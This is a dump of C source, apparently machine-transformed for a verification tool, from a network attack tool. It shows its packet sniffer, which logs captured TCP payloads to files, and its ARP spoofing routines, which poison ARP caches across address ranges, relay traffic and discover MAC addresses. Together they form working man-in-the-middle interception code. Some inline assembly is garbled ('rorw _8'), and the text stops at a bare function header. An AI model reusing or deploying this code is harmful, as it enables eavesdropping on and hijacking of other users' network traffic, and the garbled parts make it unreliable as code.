// file sniff.c line 831
void sniff_options(void)
{
  char *o_menu = "n) print new line,... as new line,...\nx) return\n";
  char *o_keys = "nx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("sniff options", o_menu, "sniffopt", o_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 110:
      {
        newline_option();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// sniff_packet_match
// file sniff.c line 165
static inline signed int sniff_packet_match(struct packet *p, struct sniff_info *si)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  _Bool tmp_if_expr_3;
  if(si->srch_mode == 0)
    tmp_if_expr_3 = (_Bool)1;

  else
    tmp_if_expr_3 = si->srch_mode == 2 ? (_Bool)1 : (_Bool)0;
  _Bool tmp_if_expr_4;
  if(tmp_if_expr_3)
    tmp_if_expr_4 = (_Bool)1;

  else
    tmp_if_expr_4 = si->log_mode == 0 ? (_Bool)1 : (_Bool)0;
  _Bool tmp_if_expr_5;
  if(tmp_if_expr_4)
    tmp_if_expr_5 = (_Bool)1;

  else
    tmp_if_expr_5 = si->log_mode == 2 ? (_Bool)1 : (_Bool)0;
  signed int return_value_port_match_2;
  signed int return_value_port_match_1;
  _Bool tmp_if_expr_8;
  _Bool tmp_if_expr_9;
  _Bool tmp_if_expr_10;
  signed int return_value_port_match_7;
  signed int return_value_port_match_6;
  if(tmp_if_expr_5)
  {
    if(!((iph->saddr & (unsigned int)si->src_mask) == (si->src_addr & (unsigned int)si->src_mask)))
      goto __CPROVER_DUMP_L7;

    if(!((iph->daddr & (unsigned int)si->dst_mask) == (si->dst_addr & (unsigned int)si->dst_mask)))
      goto __CPROVER_DUMP_L7;

    return_value_port_match_2=port_match((signed int)tcph->_anon0._anon1.source, (unsigned int *)si->src_ports);
    if(return_value_port_match_2 == 0)
      goto __CPROVER_DUMP_L7;

    return_value_port_match_1=port_match((signed int)tcph->_anon0._anon1.dest, (unsigned int *)si->dst_ports);
    if(return_value_port_match_1 == 0)
      goto __CPROVER_DUMP_L7;

    return 1;
  }

  else
  {

  __CPROVER_DUMP_L7:
    ;
    if(si->srch_mode == 1)
      tmp_if_expr_8 = (_Bool)1;

    else
      tmp_if_expr_8 = si->srch_mode == 2 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_8)
      tmp_if_expr_9 = (_Bool)1;

    else
      tmp_if_expr_9 = si->log_mode == 1 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_9)
      tmp_if_expr_10 = (_Bool)1;

    else
      tmp_if_expr_10 = si->log_mode == 2 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_10)
    {
      if(!((iph->saddr & (unsigned int)si->dst_mask) == (si->dst_addr & (unsigned int)si->dst_mask)))
        goto __CPROVER_DUMP_L14;

      if(!((iph->daddr & (unsigned int)si->src_mask) == (si->src_addr & (unsigned int)si->src_mask)))
        goto __CPROVER_DUMP_L14;

      return_value_port_match_7=port_match((signed int)tcph->_anon0._anon1.source, (unsigned int *)si->dst_ports);
      if(return_value_port_match_7 == 0)
        goto __CPROVER_DUMP_L14;

      return_value_port_match_6=port_match((signed int)tcph->_anon0._anon1.dest, (unsigned int *)si->src_ports);
      if(return_value_port_match_6 == 0)
        goto __CPROVER_DUMP_L14;

      return 1;
    }

    else
    {

    __CPROVER_DUMP_L14:
      ;
      return 0;
    }
  }
}

// sniffer
// file sniff.c line 478
static void * sniffer(void *arg)
{
  struct sniff_info *si;
  struct sniff_log *slog;
  struct packet *p;
  char *data;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 10);
  void *return_value_list_consume_2;
  do
  {
    return_value_list_consume_2=list_consume(&l_sniff_pkt, (struct timespec *)(void *)0);
    p = (struct packet *)return_value_list_consume_2;
    if(p == ((struct packet *)NULL))
      break;

    si = (struct sniff_info *)p->p_arg[(signed long int)4];
    data=sniffer_match(p, si, &slog);
    if(!(data == ((char *)NULL)))
      sniffer_log(data, p, si, slog);

    sniff_info_release(si);
    packet_free(p);
  }
  while((_Bool)1);
  return (void *)0;
}

// sniffer_log
// file sniff.c line 434
void sniffer_log(char *data, struct packet *p, struct sniff_info *si, struct sniff_log *slog)
{
  signed int data_len;
  signed int space;
  signed int i;
  void *return_value_malloc_1;
  _Bool tmp_if_expr_3;
  _Bool tmp_if_expr_2;
  if(!(data == ((char *)NULL)))
  {
    if(slog->buf == ((char *)NULL))
    {
      return_value_malloc_1=malloc((unsigned long int)2048);
      slog->buf = (char *)return_value_malloc_1;
    }

    data_len = (signed int)((signed long int)p->p_data_len - (data - p->p_data));
    if(!(data_len == 0))
      tmp_if_expr_3 = (_Bool)1;

    else
      tmp_if_expr_3 = slog->loged_bytes >= si->log_bytes ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_3)
    {
      struct iphdr *iph = p->p_iph;
      if(!(slog->src_to_dst == 0))
        tmp_if_expr_2 = slog->src_addr == iph->daddr ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_2 = (_Bool)0;
      if(tmp_if_expr_2)
      {
        sniffer_log_print(si, slog);
        slog->src_to_dst = 0;
      }

      else
        if(slog->src_to_dst == 0)
        {
          if(slog->src_addr == iph->saddr)
          {
            sniffer_log_print(si, slog);
            slog->src_to_dst = 1;
          }

        }

    }

    while(!(data_len == 0))
    {
      space = 2048 - slog->loged_bytes;
      if(!(space >= 0))
        space = 0;

      i = data_len > space ? space : data_len;
      memcpy((void *)&slog->buf[(signed long int)slog->loged_bytes], (const void *)data, (unsigned long int)i);
      slog->loged_bytes = slog->loged_bytes + i;
      data = data + (signed long int)i;
      data_len = data_len - i;
      if(slog->loged_bytes == 2048)
      {
        sniffer_log_print(si, slog);
        slog->state = si->search != ((char *)NULL) ? 1 : 2;
      }

    }
    if(slog->loged_bytes >= si->log_bytes)
    {
      sniffer_log_print(si, slog);
      slog->state = si->search != ((char *)NULL) ? 1 : 2;
    }

  }

}

// sniffer_log_print
// file sniff.c line 215
void sniffer_log_print(struct sniff_info *si, struct sniff_log *slog)
{
  char file_name[512l];
  char file_name_buf[512l];
  struct stat stat_buf;
  struct _IO_FILE *f;
  signed int i;
  unsigned short int tmp_statement_expression_2;
  unsigned short int tmp_statement_expression_4;
  signed int return_value_stat_6;
  signed int *return_value___errno_location_7;
  _Bool tmp_if_expr_11;
  _Bool tmp_if_expr_10;
  const unsigned short int **return_value___ctype_b_loc_9;
  if(!(slog->loged_bytes == 0))
  {
    if(slog->file == ((struct _IO_FILE *)NULL))
    {
      if(si->file == ((struct _IO_FILE *)NULL))
      {
        char *return_value_host_lookup_1;
        return_value_host_lookup_1=host_lookup(slog->src_addr, 1);
        unsigned short int __v;
        unsigned short int __x = (unsigned short int)slog->src_port;
        asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
        tmp_statement_expression_2 = __v;
        char *return_value_host_lookup_3;
        return_value_host_lookup_3=host_lookup(slog->dst_addr, 1);
        unsigned short int sniffer_log_print__1__1__1__2____v;
        unsigned short int sniffer_log_print__1__1__1__2____x = (unsigned short int)slog->dst_port;
        asm("rorw _8, %w0" : "=r"(sniffer_log_print__1__1__1__2____v) : "0"(sniffer_log_print__1__1__1__2____x) : "cc");
        tmp_statement_expression_4 = sniffer_log_print__1__1__1__2____v;
        sprintf(file_name_buf, "%s/%s:%d_%s:%d", (const void *)".sniff", return_value_host_lookup_1, tmp_statement_expression_2, return_value_host_lookup_3, tmp_statement_expression_4);
        signed int *return_value___errno_location_5;
        return_value___errno_location_5=__errno_location();
        *return_value___errno_location_5 = 0;
        i = 0;
        strcpy(file_name, file_name_buf);
        do
        {
          return_value_stat_6=stat(file_name, &stat_buf);
          if(!(return_value_stat_6 >= 0))
            break;

          return_value___errno_location_7=__errno_location();
          if(*return_value___errno_location_7 == 2)
            break;

          i = i + 1;
          sprintf(file_name, "%s_%d", (const void *)file_name_buf, i);
        }
        while((_Bool)1);
        f=fopen(file_name, "w");
        if(f == ((struct _IO_FILE *)NULL))
        {
          printf("cannot open %s for writing\n", (const void *)file_name);
          goto __CPROVER_DUMP_L19;
        }

        slog->file = f;
        slog->file_close = 1;
      }

      else
      {
        slog->file = si->file;
        slog->file_close = 0;
      }
    }

    sniff_log_item_print(slog->file, si, slog);
    i = 0;
    for( ; !(i >= slog->loged_bytes); i = i + 1)
    {
      const unsigned short int **return_value___ctype_b_loc_8;
      return_value___ctype_b_loc_8=__ctype_b_loc();
      if(!((16384 & (signed int)(*return_value___ctype_b_loc_8)[(signed long int)(signed int)slog->buf[(signed long int)i]]) == 0))
        tmp_if_expr_11 = (_Bool)1;

      else
      {
        if(!(o_newline == 0))
        {
          return_value___ctype_b_loc_9=__ctype_b_loc();
          tmp_if_expr_10 = ((signed int)(*return_value___ctype_b_loc_9)[(signed long int)(signed int)slog->buf[(signed long int)i]] & (signed int)(unsigned short int)8192) != 0 ? (_Bool)1 : (_Bool)0;
        }

        else
          tmp_if_expr_10 = (_Bool)0;
        tmp_if_expr_11 = tmp_if_expr_10 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_11)
        fputc((signed int)slog->buf[(signed long int)i], slog->file);

      else
        fprintf(slog->file, "[0x%X]", (unsigned char)slog->buf[(signed long int)i]);
    }
    fprintf(slog->file, "\n\n");
    fflush(slog->file);
    slog->loged_bytes = 0;
  }


__CPROVER_DUMP_L19:
  ;
}

// sniffer_match
// file sniff.c line 357
char * sniffer_match(struct packet *p, struct sniff_info *si, struct sniff_log **__slog)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  char *retval = (char *)(void *)0;
  struct list_iterator li;
  struct sniff_log *slog;
  void *rret;
  list_iter_set(&li, &si->log);
  retval = (char *)(void *)0;
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    slog = (struct sniff_log *)return_value_list_iter_get_1;
    if(slog == ((struct sniff_log *)NULL))
      break;

    retval=sniff_log_match(p, si, slog);
    if(!(retval == ((char *)NULL)))
      break;

  }
  while((_Bool)1);
  list_iter_end(&li);
  unsigned short int tmp_statement_expression_3;
  _Bool tmp_if_expr_5;
  unsigned short int tmp_statement_expression_4;
  if(retval == ((char *)NULL))
  {
    if(!(p->p_data_len == 0))
    {
      void *return_value_malloc_2;
      return_value_malloc_2=malloc(sizeof(struct sniff_log) /*56ul*/ );
      slog = (struct sniff_log *)return_value_malloc_2;
      unsigned short int sniffer_match__1__2__1____v;
      unsigned short int __x = (unsigned short int)tcph->_anon0._anon1.dest;
      asm("rorw _8, %w0" : "=r"(sniffer_match__1__2__1____v) : "0"(__x) : "cc");
      tmp_statement_expression_3 = sniffer_match__1__2__1____v;
      if((signed int)tmp_statement_expression_3 >= 1024)
      {
        unsigned short int __v;
        unsigned short int sniffer_match__1__2__2____x = (unsigned short int)tcph->_anon0._anon1.source;
        asm("rorw _8, %w0" : "=r"(__v) : "0"(sniffer_match__1__2__2____x) : "cc");
        tmp_statement_expression_4 = __v;
        tmp_if_expr_5 = (signed int)tmp_statement_expression_4 < 1024 ? (_Bool)1 : (_Bool)0;
      }

      else
        tmp_if_expr_5 = (_Bool)0;
      if(tmp_if_expr_5)
      {
        slog->src_addr = iph->daddr;
        slog->dst_addr = iph->saddr;
        slog->src_port = tcph->_anon0._anon1.dest;
        slog->dst_port = tcph->_anon0._anon1.source;
      }

      else
      {
        slog->src_addr = iph->saddr;
        slog->dst_addr = iph->daddr;
        slog->src_port = tcph->_anon0._anon1.source;
        slog->dst_port = tcph->_anon0._anon1.dest;
      }
      slog->file = (struct _IO_FILE *)(void *)0;
      slog->file_close = 0;
      slog->src_to_dst = 0;
      slog->loged_bytes = 0;
      slog->buf = (char *)(void *)0;
      slog->state = si->search != ((char *)NULL) ? 1 : 2;
      slog->next = (struct sniff_log *)(void *)0;
      list_push(&si->log, (void *)slog);
      retval=sniff_log_match(p, si, slog);
      host_lookup(slog->src_addr, 1);
      host_lookup(slog->dst_addr, 1);
    }

  }

  _Bool tmp_if_expr_6;
  if(!(retval == ((char *)NULL)))
  {
    if(!(p->p_hdr.p_tcph->_anon0._anon1.rst == 0))
      tmp_if_expr_6 = (_Bool)1;

    else
      tmp_if_expr_6 = p->p_hdr.p_tcph->_anon0._anon1.fin != 0 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_6)
    {
      sniffer_log_print(si, slog);
      rret=list_remove(&si->log, (void *)slog);
      /* assertion rret */
      assert(rret != NULL);
      free_sniff_log(slog);
      retval = (char *)(void *)0;
    }

  }

  if(retval == (char *)1)
    retval = (char *)(void *)0;

  if(!(retval == ((char *)NULL)))
    *__slog = slog;

  else
    *__slog = (struct sniff_log *)(void *)0;
  return retval;
}

// sprintf_db_ports
// file util.c line 280
signed int sprintf_db_ports(unsigned int *ports, char *buf, signed int buf_size, signed int all)
{
  char *buf_orig;
  signed int i;
  buf_orig = buf;
  signed int return_value_sprintf_1;
  if(*ports == 0u)
  {
    if(!(all == 0))
    {
      return_value_sprintf_1=sprintf(buf, "all");
      buf = buf + (signed long int)return_value_sprintf_1;
    }

    return (signed int)(buf - buf_orig);
  }

  i = 0;
  char *return_value_port_lookup_5;
  signed int return_value_sprintf_6;
  for( ; !(ports[(signed long int)i] == 0u); i = i + 1)
    if(!((65536u & ports[(signed long int)i]) == 0u))
    {
      char *return_value_port_lookup_2;
      return_value_port_lookup_2=port_lookup((unsigned short int)(ports[(signed long int)i] & 0xFFFFU), hl_mode);
      char *return_value_port_lookup_3;
      return_value_port_lookup_3=port_lookup((unsigned short int)ports[(signed long int)(i + 1)], hl_mode);
      signed int return_value_sprintf_4;
      return_value_sprintf_4=sprintf(buf, "%s:%s ", return_value_port_lookup_2, return_value_port_lookup_3);
      buf = buf + (signed long int)return_value_sprintf_4;
      i = i + 1;
    }

    else
    {
      return_value_port_lookup_5=port_lookup((unsigned short int)ports[(signed long int)i], hl_mode);
      return_value_sprintf_6=sprintf(buf, "%s ", return_value_port_lookup_5);
      buf = buf + (signed long int)return_value_sprintf_6;
    }
  *(buf - (signed long int)1) = (char)0;
  return (signed int)(buf - buf_orig);
}

// sprintf_eth_mac
// file hunt.h line 422
signed int sprintf_eth_mac(char *b, unsigned char *mac)
{
  signed int return_value_sprintf_1;
  return_value_sprintf_1=sprintf(b, "%02X:%02X:%02X:%02X:%02X:%02X", mac[(signed long int)0], mac[(signed long int)1], mac[(signed long int)2], mac[(signed long int)3], mac[(signed long int)4], mac[(signed long int)5]);
  return return_value_sprintf_1;
}

// start_arp_relayer
// file arpspoof.c line 808
static signed int start_arp_relayer(void)
{
  list_produce_start(&l_relay_pkt);
  if(!(relayer_running == 0))
  {
    printf("daemon already running\n");
    return -1;
  }

  else
  {
    pthread_create(&relay_thr, (const union pthread_attr_t *)(void *)0, arp_relay, (void *)0);
    ifunc_relay.func = func_relay;
    ifunc_relay.arg = (void *)0;
    list_enqueue(&l_ifunc_ip, (void *)&ifunc_relay);
    relayer_running = 1;
    printf("daemon started\n");
    return 0;
  }
}

// start_arp_spoof
// file hunt.h line 520
struct arp_spoof_info * start_arp_spoof(unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac, char *src_fake_mac, signed int refresh, signed int can_forward, signed int in_range)
{
  struct arp_spoof_info *asi;
  struct arp_spoof_info *tmp;
  struct timespec ts;
  struct timejob *tj;
  struct list_iterator li;
  signed int i;
  asi=get_asi(src_addr, dst_addr);
  void *return_value_list_iter_get_7;
  if(!(asi == ((struct arp_spoof_info *)NULL)))
  {
    if(asi->dst_mac_valid == 0)
    {
      if(!(dst_mac == ((char *)NULL)))
      {
        memcpy((void *)asi->dst_mac, (const void *)dst_mac, (unsigned long int)6);
        asi->dst_mac_valid = 1;
      }

    }

    if(asi->src_mac_valid == 0)
    {
      if(!(src_mac == ((char *)NULL)))
      {
        memcpy((void *)asi->src_mac, (const void *)src_mac, (unsigned long int)6);
        asi->src_mac_valid = 1;
      }

    }

    asi->use_count = asi->use_count + 1;
    return asi;
  }

  else
    if(src_fake_mac == ((char *)NULL))
      return (struct arp_spoof_info *)(void *)0;

    else
    {
      signed int return_value_list_count_1;
      return_value_list_count_1=list_count(&l_arp_spoof);
      if(return_value_list_count_1 == 0)
      {
        ifunc_arp.func = func_arp;
        ifunc_arp.arg = (void *)0;
        list_enqueue(&l_ifunc_arp, (void *)&ifunc_arp);
      }

      void *return_value_malloc_2;
      return_value_malloc_2=malloc(sizeof(struct arp_spoof_info) /*168ul*/ );
      asi = (struct arp_spoof_info *)return_value_malloc_2;
      /* assertion asi */
      assert(asi != ((struct arp_spoof_info *)NULL));
      memset((void *)asi, 0, sizeof(struct arp_spoof_info) /*168ul*/ );
      pthread_mutex_init(&asi->mutex, (const union anonymous_9 *)(void *)0);
      pthread_cond_init(&asi->lock_cond, (const union anonymous_9 *)(void *)0);
      asi->lock_count = 0;
      asi->use_count = 1;
      asi->refresh = refresh;
      asi->tj_refresh = (struct timejob *)(void *)0;
      asi->tj_reply = (struct timejob *)(void *)0;
      asi->src_addr = src_addr;
      asi->dst_addr = dst_addr;
      memcpy((void *)asi->src_fake_mac, (const void *)src_fake_mac, (unsigned long int)6);
      if(!(dst_mac == ((char *)NULL)))
      {
        memcpy((void *)asi->dst_mac, (const void *)dst_mac, (unsigned long int)6);
        asi->dst_mac_valid = 1;
      }

      else
        asi->dst_mac_valid = 0;
      if(!(src_mac == ((char *)NULL)))
      {
        memcpy((void *)asi->src_mac, (const void *)src_mac, (unsigned long int)6);
        asi->src_mac_valid = 1;
      }

      else
        asi->src_mac_valid = 0;
      asi->can_forward = can_forward;
      asi->in_range = in_range;
      if(!(asi->dst_mac_valid == 0))
      {
        send_src_spoof_to_dst(asi);
        unsigned int return_value___bswap_32_3;
        return_value___bswap_32_3=__bswap_32_link6(dst_addr);
        unsigned int return_value___bswap_32_4;
        return_value___bswap_32_4=__bswap_32_link6(return_value___bswap_32_3 + (unsigned int)1);
        send_src_spoof_to_dst_through_request(asi, return_value___bswap_32_4);
        if(!(arp_spoof_switch == 0))
        {
          ts.tv_sec = (signed long int)0;
          ts.tv_nsec = (signed long int)100000000;
          nanosleep(&ts, (struct timespec *)(void *)0);
          send_src_spoof_to_dst(asi);
          unsigned int return_value___bswap_32_5;
          return_value___bswap_32_5=__bswap_32_link6(dst_addr);
          unsigned int return_value___bswap_32_6;
          return_value___bswap_32_6=__bswap_32_link6(return_value___bswap_32_5 + (unsigned int)1);
          send_src_spoof_to_dst_through_request(asi, return_value___bswap_32_6);
        }

      }

      if(!(in_range == 0))
        list_enqueue(&l_arp_spoof, (void *)asi);

      else
      {
        i = 0;
        list_iter_set(&li, &l_arp_spoof);
        do
        {
          return_value_list_iter_get_7=list_iter_get(&li);
          tmp = (struct arp_spoof_info *)return_value_list_iter_get_7;
          if(tmp == ((struct arp_spoof_info *)NULL))
            break;

          if(!(tmp->in_range == 0))
            break;

          i = i + 1;
        }
        while((_Bool)1);
        list_iter_end(&li);
        list_insert_at(&l_arp_spoof, i, (void *)asi);
      }
      if(!(refresh == 0))
      {
        void *return_value_malloc_8;
        return_value_malloc_8=malloc(sizeof(struct timejob) /*48ul*/ );
        tj = (struct timejob *)return_value_malloc_8;
        /* assertion tj */
        assert(tj != ((struct timejob *)NULL));
        tj->j_func = arp_spoof_timejob;
        tj->j_arg = (void *)asi;
        tj->j_arg_sec = refresh;
        asi->tj_refresh = tj;
        register_timejob_rel(tj, refresh);
      }

      else
        asi->tj_refresh = (struct timejob *)(void *)0;
      return asi;
    }
}

// start_arp_spoof_range
// file arpspoof.c line 865
static signed int start_arp_spoof_range(struct arp_spoof_range *asr)
{
  struct mac_info *mi_src;
  struct mac_info *mi_dst;
  struct arp_spoof_info *asi;
  unsigned int dst_addr;
  signed int count = 0;
  mi_src=mac_info_get(asr->src_addr);
  if(mi_src == ((struct mac_info *)NULL))
    mac_discover(asr->src_addr, 2);

  dst_addr = asr->dst_start_addr;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  unsigned int return_value___bswap_32_3;
  do
  {
    return_value___bswap_32_1=__bswap_32_link6(dst_addr);
    return_value___bswap_32_2=__bswap_32_link6(asr->dst_end_addr);
    if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
      break;

    count = count + 1;
    mi_dst=mac_info_get(dst_addr);
    if(mi_dst == ((struct mac_info *)NULL))
      mac_discover(dst_addr, 2);

    else
      mac_info_release(mi_dst);
    return_value___bswap_32_3=__bswap_32_link6(dst_addr);
    dst_addr=__bswap_32_link6(return_value___bswap_32_3 + (unsigned int)1);
  }
  while((_Bool)1);
  sec_nanosleep(1);
  if(mi_src == ((struct mac_info *)NULL))
    mi_src=mac_info_get(asr->src_addr);

  if(mi_src == ((struct mac_info *)NULL))
  {
    signed int return_value_menu_choose_yn_4;
    return_value_menu_choose_yn_4=menu_choose_yn("src mac isn't known - continue? y/n", 0);
    if(!(return_value_menu_choose_yn_4 >= 1))
      return -1;

  }

  void *return_value_malloc_5;
  return_value_malloc_5=malloc((unsigned long int)count * sizeof(struct arp_spoof_info *) /*8ul*/ );
  asr->asi = (struct arp_spoof_info **)return_value_malloc_5;
  asr->asi_count = 0;
  dst_addr = asr->dst_start_addr;
  unsigned int return_value___bswap_32_6;
  unsigned int return_value___bswap_32_7;
  char *tmp_if_expr_9;
  char *tmp_if_expr_10;
  signed int tmp_post_11;
  unsigned int return_value___bswap_32_8;
  do
  {
    return_value___bswap_32_6=__bswap_32_link6(dst_addr);
    return_value___bswap_32_7=__bswap_32_link6(asr->dst_end_addr);
    if(!(return_value___bswap_32_7 >= return_value___bswap_32_6))
      break;

    mi_dst=mac_info_get(dst_addr);
    if(!(mi_src == ((struct mac_info *)NULL)))
      tmp_if_expr_9 = mi_src->mac;

    else
      tmp_if_expr_9 = (char *)(void *)0;
    if(!(mi_dst == ((struct mac_info *)NULL)))
      tmp_if_expr_10 = mi_dst->mac;

    else
      tmp_if_expr_10 = (char *)(void *)0;
    asi=start_arp_spoof(asr->src_addr, dst_addr, tmp_if_expr_9, tmp_if_expr_10, asr->src_fake_mac, asr->refresh, asr->can_forward, 1);
    if(asi == ((struct arp_spoof_info *)NULL))
      fprintf(stderr, "error: start_arp_spoof_range: asi == NULL\n");

    if(!(mi_dst == ((struct mac_info *)NULL)))
      mac_info_release(mi_dst);

    tmp_post_11 = asr->asi_count;
    asr->asi_count = asr->asi_count + 1;
    asr->asi[(signed long int)tmp_post_11] = asi;
    return_value___bswap_32_8=__bswap_32_link6(dst_addr);
    dst_addr=__bswap_32_link6(return_value___bswap_32_8 + (unsigned int)1);
  }
  while((_Bool)1);
  if(!(mi_src == ((struct mac_info *)NULL)))
    mac_info_release(mi_src);

  return 0;
}

// start_mac_discovery
// file macdisc.c line 117
static signed int start_mac_discovery(void)
{
  if(!(thr_running == 0))
  {
    printf("mac discoverer already running\n");
    return -1;
  }

  else
  {
    pthread_mutex_init(&mutex_stop, (const union anonymous_9 *)(void *)0);
    pthread_cond_init(&cond_stop, (const union anonymous_9 *)(void *)0);
    stop = 0;
    pthread_create(&mac_thr, (const union pthread_attr_t *)(void *)0, mac_disc_thr, (void *)0);
    thr_running = 1;
    return 0;
  }
}

// start_sniff
// file sniff.c line 526
static void start_sniff(void)
{
  if(!(sniffer_running == 0))
    printf("sniffer already running\n");

  else
  {
    signed int return_value_sniff_daemon_init_1;
    return_value_sniff_daemon_init_1=sniff_daemon_init();
    if(return_value_sniff_daemon_init_1 == 0)
    {
      list_produce_start(&l_sniff_pkt);
      pthread_create(&sniff_thr, (const union pthread_attr_t *)(void *)0, (void * (*)(void *))sniffer, (void *)0);
      ifunc_sniff.func = func_sniff;
      ifunc_sniff.arg = (void *)0;
      list_enqueue(&l_ifunc_tcp, (void *)&ifunc_sniff);
      sniffer_running = 1;
      printf("sniffer started\n");
    }

  }
}

// stat
// file /usr/include/x86_64-linux-gnu/sys/stat.h line 452
static inline signed int stat(const char *__path, struct stat *__statbuf)
{
  signed int return_value___xstat_1;
  return_value___xstat_1=__xstat(1, __path, __statbuf);
  return return_value___xstat_1;
}

// stop_arp_relayer
// file arpspoof.c line 824
static signed int stop_arp_relayer(void)
{
  struct packet *p;
  struct arp_spoof_info *asi;
  void *return_value_list_pop_1;
  if(relayer_running == 0)
  {
    printf("daemon isn't running\n");
    return -1;
  }

  else
  {
    list_remove(&l_ifunc_ip, (void *)&ifunc_relay);
    do
    {
      return_value_list_pop_1=list_pop(&l_relay_pkt);
      p = (struct packet *)return_value_list_pop_1;
      if(p == ((struct packet *)NULL))
        break;

      asi = (struct arp_spoof_info *)p->p_arg[(signed long int)3];
      asi_release(asi);
      packet_free(p);
    }
    while((_Bool)1);
    list_produce_done(&l_relay_pkt);
    pthread_join(relay_thr, (void **)(void *)0);
    relayer_running = 0;
    printf("daemon stopped\n");
    return 0;
  }
}

// stop_arp_spoof
// file hunt.h line 525
void stop_arp_spoof(struct arp_spoof_info *asi)
{
  struct arp_spec as_dst;
  unsigned char *asi_src_mac;
  signed int i;
  asi->use_count = asi->use_count - 1;
  unsigned char *tmp_if_expr_1;
  unsigned char *tmp_if_expr_2;
  unsigned short int tmp_statement_expression_3;
  unsigned char *tmp_if_expr_4;
  unsigned char *tmp_if_expr_5;
  unsigned short int tmp_statement_expression_6;
  if(!(asi->use_count >= 1))
  {
    list_remove(&l_arp_spoof, (void *)asi);
    if(!(asi->tj_refresh == ((struct timejob *)NULL)))
    {
      unregister_timejob(asi->tj_refresh);
      free((void *)asi->tj_refresh);
      asi->tj_refresh = (struct timejob *)(void *)0;
    }

    if(!(asi->tj_reply == ((struct timejob *)NULL)))
    {
      unregister_timejob(asi->tj_reply);
      free((void *)asi->tj_reply);
      asi->tj_reply = (struct timejob *)(void *)0;
    }

    if(!(asi->dst_mac_valid == 0))
    {
      if(!(asi->src_mac_valid == 0))
        asi_src_mac = asi->src_mac;

      else
        asi_src_mac = asi->src_fake_mac;
      if(!(arp_spoof_switch == 0))
      {
        if(!(arp_spoof_with_my_mac == 0))
          tmp_if_expr_1 = my_eth_mac;

        else
          tmp_if_expr_1 = asi->src_fake_mac;
        as_dst.src_mac = (char *)tmp_if_expr_1;
      }

      else
      {
        if(!(arp_spoof_with_my_mac == 0))
          tmp_if_expr_2 = my_eth_mac;

        else
          tmp_if_expr_2 = asi_src_mac;
        as_dst.src_mac = (char *)tmp_if_expr_2;
      }
      as_dst.dst_mac = (char *)asi->dst_mac;
      unsigned short int stop_arp_spoof__1__3__1____v;
      unsigned short int __x = (unsigned short int)2;
      asm("rorw _8, %w0" : "=r"(stop_arp_spoof__1__3__1____v) : "0"(__x) : "cc");
      tmp_statement_expression_3 = stop_arp_spoof__1__3__1____v;
      as_dst.oper = (signed int)tmp_statement_expression_3;
      as_dst.sender_mac = (char *)asi_src_mac;
      as_dst.sender_addr = (unsigned long int)asi->src_addr;
      as_dst.target_mac = (char *)asi->dst_mac;
      as_dst.target_addr = (unsigned long int)asi->dst_addr;
      i = 0;
      for( ; !(i >= arp_rr_count); i = i + 1)
        send_arp_packet(&as_dst);
      if(!(arp_spoof_switch == 0))
      {
        if(!(arp_spoof_with_my_mac == 0))
          tmp_if_expr_4 = my_eth_mac;

        else
          tmp_if_expr_4 = asi->src_fake_mac;
        as_dst.src_mac = (char *)tmp_if_expr_4;
      }

      else
      {
        if(!(arp_spoof_with_my_mac == 0))
          tmp_if_expr_5 = my_eth_mac;

        else
          tmp_if_expr_5 = asi_src_mac;
        as_dst.src_mac = (char *)tmp_if_expr_5;
      }
      as_dst.src_mac = (char *)asi->src_mac;
      as_dst.dst_mac = (char *)asi->dst_mac;
      unsigned short int __v;
      unsigned short int stop_arp_spoof__1__3__2____x = (unsigned short int)1;
      asm("rorw _8, %w0" : "=r"(__v) : "0"(stop_arp_spoof__1__3__2____x) : "cc");
      tmp_statement_expression_6 = __v;
      as_dst.oper = (signed int)tmp_statement_expression_6;
      as_dst.sender_mac = (char *)asi_src_mac;
      as_dst.sender_addr = (unsigned long int)asi->src_addr;
      as_dst.target_mac = (char *)mac_zero;
      unsigned int return_value___bswap_32_7;
      return_value___bswap_32_7=__bswap_32_link6(asi->dst_addr);
      unsigned int return_value___bswap_32_8;
      return_value___bswap_32_8=__bswap_32_link6(return_value___bswap_32_7 + (unsigned int)1);
      as_dst.target_addr = (unsigned long int)return_value___bswap_32_8;
      i = 0;
      for( ; !(i >= arp_rr_count); i = i + 1)
        send_arp_packet(&as_dst);
    }

    list_lock(&l_arp_spoof);
    signed int return_value_list_count_9;
    return_value_list_count_9=list_count(&l_arp_spoof);
    if(return_value_list_count_9 == 0)
      list_remove(&l_ifunc_arp, (void *)&ifunc_arp);

    list_unlock(&l_arp_spoof);
    asi_wait_for_release(asi);
    pthread_cond_destroy(&asi->lock_cond);
    pthread_mutex_destroy(&asi->mutex);
    free((void *)asi);
  }

}

// stop_arp_spoof_range
// file arpspoof.c line 907
static void stop_arp_spoof_range(struct arp_spoof_range *asr)
{
  signed int i = 0;
  for( ; !(i >= asr->asi_count); i = i + 1)
    stop_arp_spoof(asr->asi[(signed long int)i]);
  free((void *)asr->asi);
}

// stop_mac_discovery
// file macdisc.c line 131
static signed int stop_mac_discovery(void)
{
  if(thr_running == 0)
  {
    printf("mac discoverer isn't running\n");
    return -1;
  }

  else
  {
    stop = 1;
    pthread_mutex_lock(&mutex_stop);
    pthread_cond_signal(&cond_stop);
    pthread_mutex_unlock(&mutex_stop);
    pthread_join(mac_thr, (void **)(void *)0);
    thr_running = 0;
    return 0;
  }
}

// stop_sniff
